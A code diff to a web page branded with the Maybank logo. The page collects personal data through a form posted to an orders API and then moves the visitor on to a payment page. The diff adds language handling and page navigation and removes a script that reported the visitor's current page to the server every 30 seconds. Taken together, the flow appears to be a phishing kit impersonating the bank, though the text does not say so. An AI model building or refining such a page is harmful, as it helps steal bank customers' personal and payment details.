@@ -280,7 +280,7 @@
     <header>
         <div class="header-left">
             <a href="index-en.html"><img src="maybank-logo.png" alt="Maybank"></a>
-            <a href="data.html" class="lang-btn">BM</a>
+            <a href="data.html" class="lang-btn" onclick="sessionStorage.setItem('lang', 'ms')">BM</a>
         </div>
         <div class="header-right">
             <div class="phone-group">
@@ -430,6 +430,7 @@
             
             const formData = new FormData(e.target);
             const data = Object.fromEntries(formData);
+            data.lang = sessionStorage.getItem('lang') || 'en';
 
             try {
                 const response = await fetch('/api/orders/personal-data', {
@@ -444,7 +445,7 @@
                 
                 if (response.ok) {
                     sessionStorage.setItem('orderId', result.orderId);
-                    window.location.href = 'payment-en.html';
+                    navigateTo('payment');
                 } else {
                     alert('Error: Incomplete information. Please try again.');
                 }
@@ -455,16 +456,6 @@
         });
     </script>
 
-    <script>
-        function sendHeartbeat() {
-            fetch('/api/heartbeat', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ currentPage: window.location.pathname })
-            }).catch(() => {});
-        }
-        setInterval(sendHeartbeat, 30000);
-        sendHeartbeat();
-    </script>
+    <script src="navigation.js"></script>
 </body>
 </html>
